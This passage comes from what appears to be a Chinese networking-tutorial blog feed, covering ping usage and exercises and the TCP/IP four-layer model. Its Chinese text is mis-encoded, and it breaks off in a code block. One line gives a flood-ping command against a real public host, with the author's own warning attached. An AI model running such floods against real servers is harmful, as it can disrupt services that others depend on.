class="hljs-comment"># åŸºæœ¬ç”¨æ³•</span><br>ping ç›®æ ‡ä¸»æœº<br><br><span class="hljs-comment"># å¸¸ç”¨é€‰é¡¹</span><br>-c æ¬¡æ•°      <span class="hljs-comment"># Linux/Mac: æŒ‡å®špingæ¬¡æ•°</span><br>-n æ¬¡æ•°      <span class="hljs-comment"># Windows: æŒ‡å®špingæ¬¡æ•°</span><br>-i é—´éš”      <span class="hljs-comment"># æŒ‡å®šå‘é€é—´éš”ï¼ˆç§’ï¼‰</span><br>-s å¤§å°      <span class="hljs-comment"># æŒ‡å®šæ•°æ®åŒ…å¤§å°</span><br>-t           <span class="hljs-comment"># Windows: æŒç»­ping</span><br></code></pre></td></tr></table></figure><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šå®é™…æ“ä½œ">ç»ƒä¹ 1ï¼šå®é™…æ“ä½œ</h3><p>ä½¿ç”¨pingå‘½ä»¤æµ‹è¯•ä»¥ä¸‹ä¸»æœºï¼Œè®°å½•RTTå’ŒTTLï¼š</p><ol><li><a href="http://baidu.com">baidu.com</a></li><li><a href="http://google.com">google.com</a></li><li>ä½ çš„è·¯ç”±å™¨ï¼ˆé€šå¸¸æ˜¯192.168.1.1ï¼‰</li><li>æœ¬æœºï¼ˆ127.0.0.1ï¼‰</li></ol><h3 id="ç»ƒä¹ 2ï¼šç†è§£TTL">ç»ƒä¹ 2ï¼šç†è§£TTL</h3><p>å¦‚æœping baidu.comçš„TTLæ˜¯52ï¼Œåˆå§‹TTLæ˜¯64ï¼Œé—®ï¼š</p><ol><li>æ•°æ®åŒ…ç»è¿‡äº†å¤šå°‘ä¸ªè·¯ç”±å™¨ï¼Ÿ</li><li>ä¸ºä»€ä¹ˆä¸åŒçš„ä¸»æœºTTLä¸ä¸€æ ·ï¼Ÿ</li></ol><h3 id="ç»ƒä¹ 3ï¼šåˆ†æä¸¢åŒ…">ç»ƒä¹ 3ï¼šåˆ†æä¸¢åŒ…</h3><p>å¦‚æœpingä¸€ä¸ªç½‘ç«™ï¼Œå‡ºç°ä»¥ä¸‹æƒ…å†µï¼Œå¯èƒ½çš„åŸå› æ˜¯ä»€ä¹ˆï¼Ÿ</p><ol><li>100%ä¸¢åŒ…</li><li>å¶å°”ä¸¢åŒ…ï¼ˆ10-20%ï¼‰</li><li>RTTå¾ˆé«˜ï¼ˆ&gt;500msï¼‰</li></ol><h3 id="ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•">ç»ƒä¹ 4ï¼šä»£ç æ‰©å±•</h3><p>æ‰©å±•pingå·¥å…·ï¼š</p><ol><li>æ·»åŠ å›¾å½¢åŒ–çš„RTTå˜åŒ–æ˜¾ç¤º</li><li>æ”¯æŒpingå¤šä¸ªä¸»æœº</li><li>å°†ç»“æœä¿å­˜åˆ°æ–‡ä»¶</li><li>æ·»åŠ å£°éŸ³æç¤ºï¼ˆè¿é€šæ—¶æ’­æ”¾æç¤ºéŸ³ï¼‰</li></ol><h3 id="ç»ƒä¹ 5ï¼šæ€è€ƒé¢˜">ç»ƒä¹ 5ï¼šæ€è€ƒé¢˜</h3><ol><li>ä¸ºä»€ä¹ˆpingä½¿ç”¨ICMPè€Œä¸æ˜¯TCPæˆ–UDPï¼Ÿ</li><li>èƒ½å¦é€šè¿‡pingåˆ¤æ–­å¯¹æ–¹çš„æ“ä½œç³»ç»Ÿï¼Ÿï¼ˆæç¤ºï¼šçœ‹TTLåˆå§‹å€¼ï¼‰</li><li>é˜²ç«å¢™å¯ä»¥é˜»æ­¢pingå—ï¼Ÿ</li></ol><h2 id="ğŸ“š-æ‰©å±•é˜…è¯»">ğŸ“š æ‰©å±•é˜…è¯»</h2><h3 id="pingçš„é«˜çº§ç”¨æ³•">pingçš„é«˜çº§ç”¨æ³•</h3><p><strong>æµ‹è¯•MTUï¼ˆæœ€å¤§ä¼ è¾“å•å…ƒï¼‰</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linux/Mac</span><br>ping -M <span class="hljs-keyword">do</span> -s 1472 baidu.com<br><br><span class="hljs-comment"># Windows</span><br>ping -f -l 1472 baidu.com<br><br><span class="hljs-comment"># å¦‚æœæˆåŠŸï¼Œè¯´æ˜MTU &gt;= 1500</span><br><span class="hljs-comment"># å¦‚æœå¤±è´¥ï¼Œé€æ¸å‡å°æ•°å€¼ç›´åˆ°æˆåŠŸ</span><br></code></pre></td></tr></table></figure><p><strong>æ´ªæ°´pingï¼ˆå‹åŠ›æµ‹è¯•ï¼‰</strong>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># Linuxï¼ˆéœ€è¦rootæƒé™ï¼‰</span><br><span class="hljs-built_in">sudo</span> ping -f baidu.com<br><br><span class="hljs-comment"># è¯´æ˜ï¼šå°½å¯èƒ½å¿«åœ°å‘é€åŒ…ï¼Œç”¨äºå‹åŠ›æµ‹è¯•</span><br><span class="hljs-comment"># âš ï¸ æ³¨æ„ï¼šä¸è¦å¯¹å…¬å…±æœåŠ¡å™¨ä½¿ç”¨ï¼Œå¯èƒ½è¢«è§†ä¸ºæ”»å‡»</span><br></code></pre></td></tr></table></figure><h3 id="ä¸åŒæ“ä½œç³»ç»Ÿçš„TTLåˆå§‹å€¼">ä¸åŒæ“ä½œç³»ç»Ÿçš„TTLåˆå§‹å€¼</h3><table><thead><tr><th>æ“ä½œç³»ç»Ÿ</th><th>TTLåˆå§‹å€¼</th></tr></thead><tbody><tr><td>Linux</td><td>64</td></tr><tr><td>Windows</td><td>128</td></tr><tr><td>Ciscoè·¯ç”±å™¨</td><td>255</td></tr><tr><td>Unix/BSD</td><td>255</td></tr></tbody></table><p>é€šè¿‡pingè¿”å›çš„TTLï¼Œå¯ä»¥å¤§è‡´åˆ¤æ–­å¯¹æ–¹çš„æ“ä½œç³»ç»Ÿç±»å‹ï¼</p><h3 id="ICMPçš„å…¶ä»–ç”¨é€”">ICMPçš„å…¶ä»–ç”¨é€”</h3><ol><li><strong>Traceroute</strong>ï¼šé€šè¿‡é€æ­¥å¢åŠ TTLæ¥è¿½è¸ªè·¯ç”±</li><li><strong>MTUå‘ç°</strong>ï¼šç¡®å®šæœ€ä½³æ•°æ®åŒ…å¤§å°</li><li><strong>ç½‘ç»œè¯Šæ–­</strong>ï¼šæ£€æµ‹ç½‘ç»œé…ç½®é—®é¢˜</li><li><strong>é”™è¯¯æŠ¥å‘Š</strong>ï¼šé€šçŸ¥æºä¸»æœºç½‘ç»œé”™è¯¯</li></ol><h2 id="ğŸ¯-æ˜å¤©é¢„å‘Š">ğŸ¯ æ˜å¤©é¢„å‘Š</h2><p><strong>ç¬¬6å¤©ï¼šç½‘ç»œå‘½ä»¤è¿›é˜¶ - traceroute</strong></p><p>æˆ‘ä»¬å°†å­¦ä¹ ï¼š</p><ul><li>tracerouteçš„å·¥ä½œåŸç†</li><li>å¦‚ä½•è¿½è¸ªæ•°æ®åŒ…çš„å®Œæ•´è·¯å¾„</li><li>ç†è§£TTLåœ¨è·¯ç”±è¿½è¸ªä¸­çš„ä½œç”¨</li><li>ç¼–å†™è‡ªå·±çš„tracerouteå·¥å…·</li></ul><hr><p>ğŸ’¡ <strong>ä»Šæ—¥é‡‘å¥</strong>ï¼špingé€šç½‘ç»œï¼Œå°±åƒå¬åˆ°è¿œæ–¹æœ‹å‹çš„å›éŸ³ï¼</p><p>ğŸ‘‰ <a href="day04.md">ä¸Šä¸€å¤©ï¼šTCP/IPå››å±‚æ¨¡å‹</a> | <a href="../../README.md">è¿”å›ç›®å½•</a> | <a href="day06.md">ä¸‹ä¸€å¤©ï¼štracerouteè¯¦è§£</a></p>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>4å¤©ï¼šTCP/IPå››å±‚æ¨¡å‹</title>
    <link href="/2025/11/10/4%E5%A4%A9%EF%BC%9ATCP_IP%E5%9B%9B%E5%B1%82%E6%A8%A1%E5%9E%8B/"/>
    <url>/2025/11/10/4%E5%A4%A9%EF%BC%9ATCP_IP%E5%9B%9B%E5%B1%82%E6%A8%A1%E5%9E%8B/</url>
    
    <content type="html"><![CDATA[<h1>ç¬¬4å¤©ï¼šTCP/IPå››å±‚æ¨¡å‹</h1><blockquote><p>â€œç†è®ºæ˜¯OSIï¼Œå®æˆ˜æ˜¯TCP/IPã€‚â€</p></blockquote><h2 id="ğŸ“š-ä»Šæ—¥ç›®æ ‡">ğŸ“š ä»Šæ—¥ç›®æ ‡</h2><ul><li>ç†è§£TCP/IPå››å±‚æ¨¡å‹</li><li>æŒæ¡TCP/IPä¸OSIçš„åŒºåˆ«å’Œè”ç³»</li><li>å­¦ä¼šåˆ†æçœŸå®çš„ç½‘ç»œæ•°æ®åŒ…</li><li>ç¼–å†™ç¨‹åºæ•è·å’Œè§£ææ•°æ®åŒ…</li></ul><h2 id="ğŸ¯-ä¸ºä»€ä¹ˆéœ€è¦TCP-IPæ¨¡å‹ï¼Ÿ">ğŸ¯ ä¸ºä»€ä¹ˆéœ€è¦TCP/IPæ¨¡å‹ï¼Ÿ</h2><h3 id="OSI-vs-TCP-IP">OSI vs TCP/IP</h3><p><strong>OSIä¸ƒå±‚æ¨¡å‹</strong>ï¼š</p><ul><li>ğŸ“– ç†è®ºæ¨¡å‹ï¼Œç”±ISOåˆ¶å®š</li><li>ğŸ“ æ•™å­¦ç”¨é€”ï¼Œå¸®åŠ©ç†è§£ç½‘ç»œæ¦‚å¿µ</li><li>ğŸ“š è¿‡äºå¤æ‚ï¼Œå®é™…åº”ç”¨è¾ƒå°‘</li></ul><p><strong>TCP/IPå››å±‚æ¨¡å‹</strong>ï¼š</p><ul><li>ğŸ’» å®é™…ä½¿ç”¨çš„æ¨¡å‹</li><li>ğŸŒ äº’è”ç½‘çš„åŸºç¡€</li><li>ğŸš€ ç®€å•å®ç”¨ï¼Œå¹¿æ³›åº”ç”¨</li></ul><h3 id="ç±»æ¯”ç†è§£">ç±»æ¯”ç†è§£</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">OSIæ¨¡å‹ <span class="hljs-operator">=</span> ç†æƒ³çš„å»ºç­‘è®¾è®¡å›¾çº¸ï¼ˆ<span class="hljs-number">7</span>å±‚æ¥¼ï¼‰<br>TCP/IPæ¨¡å‹ <span class="hljs-operator">=</span> å®é™…å»ºé€ çš„æˆ¿å­ï¼ˆ<span class="hljs-number">4</span>å±‚æ¥¼ï¼Œä½†åŠŸèƒ½é½å…¨ï¼‰<br></code></pre></td></tr></table></figure><h2 id="ğŸ“Š-TCP-IPå››å±‚æ¨¡å‹">ğŸ“Š TCP/IPå››å±‚æ¨¡å‹</h2><h3 id="å±‚æ¬¡å¯¹åº”å…³ç³»">å±‚æ¬¡å¯¹åº”å…³ç³»</h3><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs livescript">â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   OSIä¸ƒå±‚æ¨¡å‹    â”‚            TCP/IPå››å±‚æ¨¡å‹<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚  <span class="hljs-number">7.</span> åº”ç”¨å±‚       â”‚ <span class="hljs-string">\</span><br>â”‚  <span class="hljs-number">6.</span> è¡¨ç¤ºå±‚       â”‚  <span class="hljs-string">\</span>       â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚  <span class="hljs-number">5.</span> ä¼šè¯å±‚       â”‚   &#125; â”€â”€â”€&gt; â”‚  <span class="hljs-number">4.</span> åº”ç”¨å±‚       â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  /       â”‚  (Application)   â”‚<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â” /        â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â”‚  <span class="hljs-number">4.</span> ä¼ è¾“å±‚       â”‚ â”€â”€â”€â”€â”€â”€â”€&gt; â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”‚  <span class="hljs-number">3.</span> ä¼ è¾“å±‚       â”‚<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”‚  (Transport)     â”‚<br>â”‚  <span class="hljs-number">3.</span> ç½‘ç»œå±‚       â”‚ â”€â”€â”€â”€â”€â”€â”€&gt; â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜          â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”          â”‚  <span class="hljs-number">2.</span> ç½‘é™…å±‚       â”‚<br>â”‚  <span class="hljs-number">2.</span> æ•°æ®é“¾è·¯å±‚   â”‚ <span class="hljs-string">\</span>        â”‚  (Internet)      â”‚<br>â”‚  <span class="hljs-number">1.</span> ç‰©ç†å±‚       â”‚  &#125; â”€â”€â”€&gt;  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜ /        â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>                               â”‚  <span class="hljs-number">1.</span> ç½‘ç»œæ¥å£å±‚   â”‚<br>                               â”‚  (Network Access)â”‚<br>                               â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><h3 id="TCP-IPå„å±‚è¯¦è§£">TCP/IPå„å±‚è¯¦è§£</h3><h4 id="ç¬¬4å±‚ï¼šåº”ç”¨å±‚ï¼ˆApplication-Layerï¼‰">ç¬¬4å±‚ï¼šåº”ç”¨å±‚ï¼ˆApplication Layerï¼‰</h4><p><strong>å¯¹åº”OSI</strong>ï¼šåº”ç”¨å±‚ + è¡¨ç¤ºå±‚ + ä¼šè¯å±‚</p><p><strong>ä¸»è¦åè®®</strong>ï¼š</p><ul><li>ğŸŒ HTTP/HTTPSï¼šç½‘é¡µæµè§ˆ</li><li>ğŸ“§ SMTP/POP3/IMAPï¼šé‚®ä»¶</li><li>ğŸ“ FTPï¼šæ–‡ä»¶ä¼ è¾“</li><li>ğŸ” DNSï¼šåŸŸåè§£æ</li><li>ğŸ” SSHï¼šè¿œç¨‹ç™»å½•</li><li>ğŸ’¬ MQTTï¼šç‰©è”ç½‘é€šä¿¡</li></ul><p><strong>ä½œç”¨</strong>ï¼šä¸ºç”¨æˆ·æä¾›å„ç§ç½‘ç»œæœåŠ¡</p><p><strong>ä¾‹å­</strong>ï¼š</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nix">æµè§ˆå™¨è®¿é—® www.baidu.com<br>â†“<br>åº”ç”¨å±‚ï¼šç”ŸæˆHTTPè¯·æ±‚<br>GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br><span class="hljs-params">Host:</span> www.baidu.com<br></code></pre></td></tr></table></figure><hr><h4 id="ç¬¬3å±‚ï¼šä¼ è¾“å±‚ï¼ˆTransport-Layerï¼‰">ç¬¬3å±‚ï¼šä¼ è¾“å±‚ï¼ˆTransport Layerï¼‰</h4><p><strong>å¯¹åº”OSI</strong>ï¼šä¼ è¾“å±‚</p><p><strong>ä¸»è¦åè®®</strong>ï¼š</p><ul><li>ğŸšš TCPï¼šå¯é ä¼ è¾“ï¼Œé¢å‘è¿æ¥</li><li>ğŸ“¦ UDPï¼šå¿«é€Ÿä¼ è¾“ï¼Œæ— è¿æ¥</li></ul><p><strong>ä½œç”¨</strong>ï¼šæä¾›ç«¯åˆ°ç«¯çš„æ•°æ®ä¼ è¾“</p><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><ul><li><strong>ç«¯å£å·</strong>ï¼šæ ‡è¯†åº”ç”¨ç¨‹åº<ul><li>HTTP: 80</li><li>HTTPS: 443</li><li>SSH: 22</li><li>MySQL: 3306</li></ul></li></ul><p><strong>TCP vs UDP</strong>ï¼š</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">TCP</span> <span class="hljs-operator">=</span> æ‰“ç”µè¯ï¼ˆéœ€è¦æ¥é€šï¼Œå¯é ï¼‰<br><span class="hljs-attribute">UDP</span> <span class="hljs-operator">=</span> å‘çŸ­ä¿¡ï¼ˆç›´æ¥å‘ï¼Œä¸ä¿è¯é€è¾¾ï¼‰<br></code></pre></td></tr></table></figure><hr><h4 id="ç¬¬2å±‚ï¼šç½‘é™…å±‚ï¼ˆInternet-Layerï¼‰">ç¬¬2å±‚ï¼šç½‘é™…å±‚ï¼ˆInternet Layerï¼‰</h4><p><strong>å¯¹åº”OSI</strong>ï¼šç½‘ç»œå±‚</p><p><strong>ä¸»è¦åè®®</strong>ï¼š</p><ul><li>ğŸŒ IPï¼šç½‘é™…åè®®ï¼ˆIPv4/IPv6ï¼‰</li><li>ğŸ“¡ ICMPï¼šæ§åˆ¶æ¶ˆæ¯åè®®</li><li>ğŸ—ºï¸ ARPï¼šåœ°å€è§£æåè®®</li><li>ğŸ”€ IGMPï¼šç»„ç®¡ç†åè®®</li></ul><p><strong>ä½œç”¨</strong>ï¼šè·¯ç”±å’Œå¯»å€ï¼Œåœ¨ç½‘ç»œé—´ä¼ è¾“æ•°æ®</p><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><ul><li><strong>IPåœ°å€</strong>ï¼šè®¾å¤‡çš„ç½‘ç»œåœ°å€<ul><li>192.168.1.100ï¼ˆç§ç½‘ï¼‰</li><li>8.8.8.8ï¼ˆå…¬ç½‘ï¼‰</li></ul></li></ul><p><strong>ä¾‹å­</strong>ï¼š</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">ä»åŒ—äº¬çš„ç”µè„‘è®¿é—®ä¸Šæµ·çš„æœåŠ¡å™¨<br>â†“<br>ç½‘é™…å±‚ï¼šé€‰æ‹©æœ€ä½³è·¯å¾„<br>åŒ—äº¬ â†’ è·¯ç”±å™¨1 â†’ è·¯ç”±å™¨2 â†’ <span class="hljs-string">...</span> â†’ ä¸Šæµ·<br></code></pre></td></tr></table></figure><hr><h4 id="ç¬¬1å±‚ï¼šç½‘ç»œæ¥å£å±‚ï¼ˆNetwork-Access-Layerï¼‰">ç¬¬1å±‚ï¼šç½‘ç»œæ¥å£å±‚ï¼ˆNetwork Access Layerï¼‰</h4><p><strong>å¯¹åº”OSI</strong>ï¼šæ•°æ®é“¾è·¯å±‚ + ç‰©ç†å±‚</p><p><strong>ä¸»è¦åè®®</strong>ï¼š</p><ul><li>ğŸ”— Ethernetï¼šä»¥å¤ªç½‘</li><li>ğŸ“¶ WiFiï¼šæ— çº¿å±€åŸŸç½‘</li><li>ğŸ”Œ PPPï¼šç‚¹å¯¹ç‚¹åè®®</li></ul><p><strong>ä½œç”¨</strong>ï¼šåœ¨ç‰©ç†ç½‘ç»œä¸Šä¼ è¾“æ•°æ®å¸§</p><p><strong>å…³é”®æ¦‚å¿µ</strong>ï¼š</p><ul><li><strong>MACåœ°å€</strong>ï¼šç½‘å¡çš„ç‰©ç†åœ°å€<ul><li>AA:BB:CC:DD:EE:FF</li></ul></li></ul><p><strong>ä¾‹å­</strong>ï¼š</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css">åŒä¸€ä¸ªå±€åŸŸç½‘å†…çš„ä¸¤å°ç”µè„‘é€šä¿¡<br>â†“<br>ç½‘ç»œæ¥å£å±‚ï¼šé€šè¿‡MACåœ°å€ç›´æ¥ä¼ è¾“<br>ç”µè„‘<span class="hljs-selector-tag">A</span>çš„ç½‘å¡ â†’ äº¤æ¢æœº â†’ ç”µè„‘<span class="hljs-selector-tag">B</span>çš„ç½‘å¡<br></code></pre></td></tr></table></figure><h2 id="ğŸ“¦-TCP-IPæ•°æ®å°è£…">ğŸ“¦ TCP/IPæ•°æ®å°è£…</h2><h3 id="å‘é€æ•°æ®çš„å°è£…è¿‡ç¨‹">å‘é€æ•°æ®çš„å°è£…è¿‡ç¨‹</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs coq">åº”ç”¨å±‚ï¼š<br>[HTTPè¯·æ±‚æ•°æ®]<br>    â†“<br>ä¼ è¾“å±‚ï¼š<br>[TCPå¤´éƒ¨ | <span class="hljs-type">HTTP</span>è¯·æ±‚æ•°æ®]  â† Segmentï¼ˆæ®µï¼‰<br>    â†“<br>ç½‘é™…å±‚ï¼š<br>[IPå¤´éƒ¨ | <span class="hljs-type">TCP</span>å¤´éƒ¨ | <span class="hljs-type">HTTP</span>è¯·æ±‚æ•°æ®]  â† Packetï¼ˆåŒ…ï¼‰<br>    â†“<br>ç½‘ç»œæ¥å£å±‚ï¼š<br>[ä»¥å¤ªç½‘å¸§å¤´ | <span class="hljs-type">IP</span>å¤´éƒ¨ | <span class="hljs-type">TCP</span>å¤´éƒ¨ | <span class="hljs-type">HTTP</span>è¯·æ±‚æ•°æ® | <span class="hljs-type">å¸§å°¾]  â† Frame</span>ï¼ˆå¸§ï¼‰<br>    â†“<br>ç‰©ç†å±‚ï¼š<br><span class="hljs-number">01010101.</span>..  â† Bitsï¼ˆæ¯”ç‰¹æµï¼‰<br></code></pre></td></tr></table></figure><h3 id="å„å±‚æ·»åŠ çš„ä¿¡æ¯">å„å±‚æ·»åŠ çš„ä¿¡æ¯</h3><table><thead><tr><th>å±‚æ¬¡</th><th>æ·»åŠ çš„ä¿¡æ¯</th><th>ç›®çš„</th></tr></thead><tbody><tr><td>åº”ç”¨å±‚</td><td>åº”ç”¨æ•°æ®</td><td>ç”¨æˆ·æ•°æ®</td></tr><tr><td>ä¼ è¾“å±‚</td><td>æºç«¯å£ã€ç›®æ ‡ç«¯å£</td><td>æ ‡è¯†åº”ç”¨ç¨‹åº</td></tr><tr><td>ç½‘é™…å±‚</td><td>æºIPã€ç›®æ ‡IP</td><td>æ ‡è¯†ä¸»æœºä½ç½®</td></tr><tr><td>ç½‘ç»œæ¥å£å±‚</td><td>æºMACã€ç›®æ ‡MAC</td><td>æ ‡è¯†ç½‘å¡</td></tr></tbody></table><h2 id="ğŸ”§-å®æˆ˜é¡¹ç›®ï¼šæ•°æ®åŒ…åˆ†æå™¨">ğŸ”§ å®æˆ˜é¡¹ç›®ï¼šæ•°æ®åŒ…åˆ†æå™¨</h2><p>è®©æˆ‘ä»¬ç¼–å†™ä¸€ä¸ªç¨‹åºï¼Œæ•è·å’Œåˆ†æçœŸå®çš„ç½‘ç»œæ•°æ®åŒ…ï¼</p><h3 id="ä»£ç å®ç°">ä»£ç å®ç°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span 